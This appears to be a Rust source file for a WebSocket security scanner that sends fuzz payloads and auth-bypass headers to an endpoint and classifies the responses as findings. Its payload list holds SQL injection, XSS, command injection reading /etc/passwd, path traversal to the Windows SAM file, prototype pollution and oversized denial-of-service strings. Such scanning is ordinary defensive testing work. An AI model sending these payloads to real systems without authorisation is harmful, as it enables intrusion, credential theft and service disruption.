// API fuzzer - no unused imports
use anyhow::Result;
use base64::Engine;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::io::{
    AsyncReadExt, AsyncWriteExt
};
use tokio::time::timeout;

/// WebSocket vulnerability testing
pub struct WebSocketTester {
    timeout: Duration,
    fuzz_payloads: Vec<String>,
}

impl WebSocketTester {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(10),
            fuzz_payloads: Self::generate_fuzz_payloads(),
        }
    }

    fn generate_fuzz_payloads() -> Vec<String> {
        vec![
            // SQL injection in WebSocket messages
            r#"{"type": "message", "content": "' OR '1'='1"}"#.to_string(),
            r#"{"type": "message", "content": "'; DROP TABLE users--"}"#.to_string(),
            
            // XSS through WebSocket
            r#"{"type": "message", "content": "<script>alert('xss')</script>"}"#.to_string(),
            r#"{"type": "message", "content": "<img src=x onerror=alert(1)>"}"#.to_string(),
            
            // Command injection
            r#"{"cmd": "ping", "target": "; whoami"}"#.to_string(),
            r#"{"cmd": "nslookup", "host": "; cat /etc/passwd"}"#.to_string(),
            
            // Path traversal
            r#"{"action": "download", "file": "../../../etc/passwd"}"#.to_string(),
            r#"{"action": "read", "path": "..\\..\\windows\\system32\\config\\sam"}"#.to_string(),
            
            // JSON injection / prototype pollution
            r#"{"__proto__": {"isAdmin": true}}"#.to_string(),
            r#"{"constructor": {"prototype": {"isAdmin": true}}}"#.to_string(),
            
            // Large payloads (DoS)
            "A".repeat(100000),
            r#"{"data": ""#.to_string() + &"A".repeat(100000) + r#""}"#,
            
            // Malformed JSON
            "{".to_string(),
            "}".to_string(),
            "[1, 2, 3".to_string(),
            r#"{"key": "value"#.to_string(),
            
            // Special characters (using bytes to avoid range errors)
            String::from_utf8(vec![0x00, 0x01, 0x02, 0x03]).unwrap_or_default(),
            String::from_utf8(vec![0xFF, 0xFE]).unwrap_or_default(),
            
            // Format string injection
            "%s%s%s%s%s%s%s%s".to_string(),
            "%x%x%x%x".to_string(),
            "%n%n%n".to_string(),
        ]
    }

    /// Test WebSocket endpoint for vulnerabilities
    pub async fn test_endpoint(&self, url: &str) -> Vec<WebSocketFinding> {
        let mut findings = Vec::new();
        
        // Parse WebSocket URL
        let (host, port, path, secure) = self.parse_ws_url(url);
        
        println!("[WS] Testing {}:{}{} (secure={})", host, port, path, secure);
        
        // Test connection
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                println!("[WS] Connected successfully");
                
                // Perform WebSocket handshake
                if let Err(e) = self.perform_handshake(&mut stream, &host, &path).await {
                    findings.push(WebSocketFinding {
                        severity: Severity::Medium,
                        title: "WebSocket Handshake Failed".to_string(),
                        description: format!("Handshake error: {}", e),
                    });
                    return findings;
                }
                
                // Test message handling
                for (idx, payload) in self.fuzz_payloads.iter().enumerate() {
                    println!("[WS] Testing payload {}/{}", idx + 1, self.fuzz_payloads.len());
                    
                    match self.send_message(&mut stream, payload).await {
                        Ok(response) => {
                            let finding = self.analyze_response(&response, payload);
                            if let Some(f) = finding {
                                findings.push(f);
                            }
                        }
                        Err(e) => {
                            let err_str = e.to_string();
                            if err_str.contains("timeout") {
                                findings.push(WebSocketFinding {
                                    severity: Severity::High,
                                    title: "WebSocket Timeout".to_string(),
                                    description: format!("Server did not respond to payload: {}", &payload[..payload.len().min(50)]),
                                });
                            }
                        }
                    }
                    
                    // Brief delay between tests
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
                
                // Close connection gracefully
                let _ = self.close_connection(&mut stream).await;
            }
            Err(e) => {
                findings.push(WebSocketFinding {
                    severity: Severity::Info,
                    title: "WebSocket Connection Failed".to_string(),
                    description: format!("Could not connect: {}", e),
                });
            }
        }
        
        findings
    }

    /// Parse WebSocket URL components
    fn parse_ws_url(&self, url: &str) -> (String, u16, String, bool) {
        let secure = url.starts_with("wss://");
        let url = url.trim_start_matches("ws://").trim_start_matches("wss://");
        
        let parts: Vec<_> = url.split('/').collect();
        let host_port = parts[0];
        let path = if parts.len() > 1 {
            format!("/{}", parts[1..].join("/"))
        } else {
            "/".to_string()
        };
        
        let (host, port) = if host_port.contains(':') {
            let hp: Vec<_> = host_port.split(':').collect();
            (hp[0].to_string(), hp[1].parse().unwrap_or(if secure { 443 } else { 80 }))
        } else {
            (host_port.to_string(), if secure { 443 } else { 80 })
        };
        
        (host, port, path, secure)
    }

    /// Establish TCP connection
    async fn connect(&self, host: &str, port: u16, secure: bool) -> Result<TcpStream> {
        let addr = format!("{}:{}", host, port);
        
        if secure {
            // For TLS, we'd need tokio-native-tls or similar
            // Simplified - just TCP for now
            println!("[WS] Note: TLS connection would use tokio-native-tls");
        }
        
        let stream = TcpStream::connect(&addr).await?;
        Ok(stream)
    }

    /// Perform WebSocket handshake (simplified)
    async fn perform_handshake(&self, stream: &mut TcpStream, host: &str, path: &str) -> Result<()> {
        let key = self.generate_websocket_key();
        
        let request = format!(
            "GET {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Upgrade: websocket\r\n\
             Connection: Upgrade\r\n\
             Sec-WebSocket-Key: {}\r\n\
             Sec-WebSocket-Version: 13\r\n\
             \r\n",
            path, host, key
        );
        
        stream.write_all(request.as_bytes()).await?;
        
        let mut buffer = vec![0u8; 1024];
        let n = timeout(self.timeout, stream.read(&mut buffer)).await??;
        
        let response = String::from_utf8_lossy(&buffer[..n]);
        
        if !response.contains("101 Switching Protocols") {
            return Err(anyhow::anyhow!("WebSocket handshake failed: {}", response.lines().next().unwrap_or("")));
        }
        
        Ok(())
    }

    /// Generate WebSocket key for handshake
    fn generate_websocket_key(&self) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        
        // Base64 encode using the standard engine
        let engine = base64::engine::general_purpose::STANDARD;
        engine.encode(&timestamp.to_be_bytes()[..16])
    }

    /// Send WebSocket frame with message
    async fn send_message(&self, stream: &mut TcpStream, payload: &str) -> Result<String> {
        // Build WebSocket text frame
        let mut frame = Vec::new();
        
        // FIN=1, opcode=1 (text)
        frame.push(0x81);
        
        let payload_bytes = payload.as_bytes();
        let len = payload_bytes.len();
        
        // Payload length
        if len < 126 {
            frame.push(len as u8);
        } else if len < 65536 {
            frame.push(126);
            frame.extend_from_slice(&(len as u16).to_be_bytes());
        } else {
            frame.push(127);
            frame.extend_from_slice(&(len as u64).to_be_bytes());
        }
        
        // Mask payload (client must mask) - generate random mask
        let mask: [u8; 4] = [
            (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos() % 256) as u8,
            (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos() % 257) as u8,
            (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos() % 258) as u8,
            (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos() % 259) as u8,
        ];
        frame.extend_from_slice(&mask);
        
        for (i, byte) in payload_bytes.iter().enumerate() {
            frame.push(byte ^ mask[i % 4]);
        }
        
        stream.write_all(&frame).await?;
        
        // Read response
        let mut buffer = vec![0u8; 4096];
        let n = timeout(self.timeout, stream.read(&mut buffer)).await??;
        
        // Unmask and decode response
        if n > 2 {
            let payload_start = 2;
            let masked = (buffer[1] & 0x80) != 0;
            let response = if masked && n > 6 {
                let mask_key = &buffer[2..6];
                let masked_data = &buffer[6..n];
                masked_data.iter().enumerate()
                    .map(|(i, b)| (b ^ mask_key[i % 4]) as char)
                    .collect()
            } else {
                String::from_utf8_lossy(&buffer[payload_start..n]).to_string()
            };
            Ok(response)
        } else {
            Ok(String::new())
        }
    }

    /// Close WebSocket connection
    async fn close_connection(&self, stream: &mut TcpStream) -> Result<()> {
        // Send close frame
        let close_frame = vec![0x88, 0x00]; // FIN=1, opcode=8 (close)
        stream.write_all(&close_frame).await?;
        Ok(())
    }

    /// Analyze WebSocket response for vulnerabilities
    fn analyze_response(&self, response: &str, payload: &str) -> Option<WebSocketFinding> {
        // Check for SQL errors
        let sql_errors = vec![
            "sql syntax",
            "mysql error",
            "sqlite error",
            "postgresql error",
            "ora-",
        ];
        
        let lower_resp = response.to_lowercase();
        
        for error in &sql_errors {
            if lower_resp.contains(error) {
                return Some(WebSocketFinding {
                    severity: Severity::Critical,
                    title: "WebSocket SQL Injection".to_string(),
                    description: format!("SQL error detected in response to: {}", &payload[..payload.len().min(50)]),
                });
            }
        }
        
        // Check for XSS reflection
        if response.contains("<script") || response.contains("alert(") {
            return Some(WebSocketFinding {
                severity: Severity::High,
                title: "WebSocket XSS".to_string(),
                description: "Script content reflected in WebSocket response".to_string(),
            });
        }
        
        // Check for command output
        if response.contains("uid=") || response.contains("root:") || response.contains("administrator") {
            return Some(WebSocketFinding {
                severity: Severity::Critical,
                title: "WebSocket Command Injection".to_string(),
                description: "Command output detected in WebSocket response".to_string(),
            });
        }
        
        // Check for file content
        if response.contains("[extensions]") || response.contains("for 16-bit app support") {
            return Some(WebSocketFinding {
                severity: Severity::Critical,
                title: "WebSocket Path Traversal".to_string(),
                description: "File content exposed through WebSocket".to_string(),
            });
        }
        
        // Check for prototype pollution
        if lower_resp.contains("isadmin") || lower_resp.contains("is_admin") {
            return Some(WebSocketFinding {
                severity: Severity::High,
                title: "WebSocket Prototype Pollution".to_string(),
                description: "Privilege escalation through prototype pollution".to_string(),
            });
        }
        
        None
    }

    /// Test for WebSocket-specific vulnerabilities
    pub async fn test_vulnerabilities(&self, url: &str) -> Vec<WebSocketFinding> {
        let mut findings = Vec::new();
        
        // Test authentication bypass
        findings.extend(self.test_auth_bypass(url).await);
        
        // Test for unauthenticated access
        findings.extend(self.test_unauthenticated(url).await);
        
        // Test for message format confusion
        findings.extend(self.test_format_confusion(url).await);
        
        findings
    }

    async fn test_auth_bypass(&self, url: &str) -> Vec<WebSocketFinding> {
        let mut findings = Vec::new();
        
        // Parse WebSocket URL
        let (host, port, path, secure) = self.parse_ws_url(url);
        
        // Test 1: Connect without authentication headers
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                // Attempt handshake without any auth
                if let Err(e) = self.perform_handshake(&mut stream, &host, &path).await {
                    findings.push(WebSocketFinding {
                        severity: Severity::Info,
                        title: "Auth Required".to_string(),
                        description: format!("WebSocket requires authentication: {}", e),
                    });
                } else {
                    // Successfully connected without auth - this is a finding
                    findings.push(WebSocketFinding {
                        severity: Severity::High,
                        title: "WebSocket Authentication Bypass".to_string(),
                        description: "Successfully connected without authentication".to_string(),
                    });
                    
                    // Try sending a test message
                    match self.send_message(&mut stream, r#"{"ping": true}"#).await {
                        Ok(response) => {
                            findings.push(WebSocketFinding {
                                severity: Severity::Critical,
                                title: "Unauthenticated Message Accepted".to_string(),
                                description: format!("Server responded to unauthenticated message: {}", 
                                    &response[..response.len().min(100)]),
                            });
                        }
                        Err(_) => {}
                    }
                }
                let _ = self.close_connection(&mut stream).await;
            }
            Err(_) => {}
        }
        
        // Test 2: Try common authentication bypass headers
        let bypass_headers = vec![
            ("Authorization", "Bearer null"),
            ("Authorization", "Bearer invalid"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
        ];
        
        for (header, value) in &bypass_headers {
            match self.connect(&host, port, secure).await {
                Ok(mut stream) => {
                    // Perform handshake with bypass header injected in raw HTTP
                    let key = self.generate_websocket_key();
                    let request = format!(
                        "GET {} HTTP/1.1\r\n\
                         Host: {}\r\n\
                         Upgrade: websocket\r\n\
                         Connection: Upgrade\r\n\
                         Sec-WebSocket-Key: {}\r\n\
                         Sec-WebSocket-Version: 13\r\n\
                         {}: {}\r\n\
                         \r\n",
                        path, host, key, header, value
                    );
                    
                    if let Err(e) = stream.write_all(request.as_bytes()).await {
                        println!("[WS-AUTH] Write error with {} header: {}", header, e);
                        continue;
                    }
                    
                    let mut buffer = vec![0u8; 1024];
                    match timeout(self.timeout, stream.read(&mut buffer)).await {
                        Ok(Ok(n)) if n > 0 => {
                            let response = String::from_utf8_lossy(&buffer[..n]);
                            if response.contains("101 Switching Protocols") {
                                findings.push(WebSocketFinding {
                                    severity: Severity::Medium,
                                    title: format!("Potential Auth Bypass with {}", header),
                                    description: format!("Handshake succeeded with {} header set to '{}'", header, value),
                                });
                            }
                        }
                        _ => {}
                    }
                    let _ = self.close_connection(&mut stream).await;
                }
                Err(_) => {}
            }
            
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        
        findings
    }

    async fn test_unauthenticated(&self, url: &str) -> Vec<WebSocketFinding> {
        let mut findings = Vec::new();
        
        let (host, port, path, secure) = self.parse_ws_url(url);
        
        // Connect and try various unauthenticated operations
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                if let Err(_) = self.perform_handshake(&mut stream, &host, &path).await {
                    return findings;
                }
                
                // Test operations that might work without auth
                let test_messages = vec![
                    r#"{"action": "get_status"}"#,
                    r#"{"action": "list_channels"}"#,
                    r#"{"action": "ping"}"#,
                    r#"{"subscribe": "*"}"#,
                    r#"{"join": "lobby"}"#,
                ];
                
                for msg in test_messages {
                    match self.send_message(&mut stream, msg).await {
                        Ok(response) => {
                            if !response.is_empty() && !response.contains("error") {
                                findings.push(WebSocketFinding {
                                    severity: Severity::High,
                                    title: "Unauthenticated Operation Allowed".to_string(),
                                    description: format!("Operation succeeded without auth: '{}' -> '{}'", 
                                        &msg[..msg.len().min(50)], 
                                        &response[..response.len().min(100)]),
                                });
                            }
                        }
                        Err(_) => {}
                    }
                    tokio::time::sleep(Duration::from_millis(50)).await;
                }
                
                let _ = self.close_connection(&mut stream).await;
            }
            Err(_) => {}
        }
        
        findings
    }

    async fn test_format_confusion(&self, url: &str) -> Vec<WebSocketFinding> {
        let mut findings = Vec::new();
        
        let (host, port, _path, secure) = self.parse_ws_url(url);
        
        // Test 1: Binary frame confusion - send binary data as text
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                // Send a malformed frame with binary opcode but text data
                let malformed_frame = vec![
                    0x82, // FIN=1, opcode=2 (binary)
                    0x85, // MASK=1, len=5
                    0x00, 0x00, 0x00, 0x00, // mask key (all zeros for test)
                    b'h', b'e', b'l', b'l', b'o', // unmasked "hello"
                ];
                
                if let Err(e) = stream.write_all(&malformed_frame).await {
                    println!("[WS-FORMAT] Binary frame test error: {}", e);
                }
                
                let mut buffer = vec![0u8; 1024];
                match timeout(self.timeout, stream.read(&mut buffer)).await {
                    Ok(Ok(n)) if n > 0 => {
                        let response = String::from_utf8_lossy(&buffer[..n]);
                        if response.contains("close") || response.contains("error") {
                            findings.push(WebSocketFinding {
                                severity: Severity::Medium,
                                title: "WebSocket Format Confusion - Binary/Text".to_string(),
                                description: "Server may be vulnerable to frame confusion attacks".to_string(),
                            });
                        }
                    }
                    _ => {}
                }
            }
            Err(_) => {}
        }
        
        // Test 2: Control frame injection
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                // Send ping frame with large payload (should be limited to 125 bytes)
                let oversized_ping = vec![
                    0x89, // FIN=1, opcode=9 (ping)
                    0xFE, // MASK=1, 126 length indicator
                    0x00, 0x80, // 128 bytes (exceeds 125 limit)
                ];
                
                if let Err(_) = stream.write_all(&oversized_ping).await {
                    // Expected - server should reject
                }
                
                let mut buffer = vec![0u8; 1024];
                match timeout(self.timeout, stream.read(&mut buffer)).await {
                    Ok(Ok(n)) if n > 0 => {
                        findings.push(WebSocketFinding {
                            severity: Severity::Low,
                            title: "Control Frame Size Not Enforced".to_string(),
                            description: "Server accepted oversized control frame".to_string(),
                        });
                    }
                    _ => {
                        // Properly rejected - no finding
                    }
                }
            }
            Err(_) => {}
        }
        
        // Test 3: Fragmented message with mixed opcodes
        match self.connect(&host, port, secure).await {
            Ok(mut stream) => {
                // First frame: text start (FIN=0)
                let frag1 = vec![
                    0x01, // FIN=0, opcode=1 (text)
                    0x85, // MASK=1, len=5
                    0x00, 0x00, 0x00, 0x00,
                    b'h', b'e', b'l', b'l', b'o',
                ];
                
                // Second frame: continuation but with binary opcode (wrong)
                let frag2 = vec![
                    0x82, // FIN=1, opcode=2 (binary - wrong!)
                    0x85, // MASK=1, len=5
                    0x00, 0x00, 0x00, 0x00,
                    b'w', b'o', b'r', b'l', b'd',
                ];
                
                let _ = stream.write_all(&frag1).await;
                let _ = stream.write_all(&frag2).await;
                
                let mut buffer = vec![0u8; 1024];
                match timeout(self.timeout, stream.read(&mut buffer)).await {
                    Ok(Ok(n)) if n > 0 => {
                        let response = String::from_utf8_lossy(&buffer[..n]);
                        if !response.contains("error") {
                            findings.push(WebSocketFinding {
                                severity: Severity::Medium,
                                title: "Fragmented Message Opcode Confusion".to_string(),
                                description: "Server accepted fragmented message with mixed opcodes".to_string(),
                            });
                        }
                    }
                    _ => {}
                }
            }
            Err(_) => {}
        }
        
        findings
    }
}

#[derive(Debug, Clone)]
pub struct WebSocketFinding {
    pub severity: Severity,
    pub title: String,
    pub description: String,
}

#[derive(Debug, Clone, Copy)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}
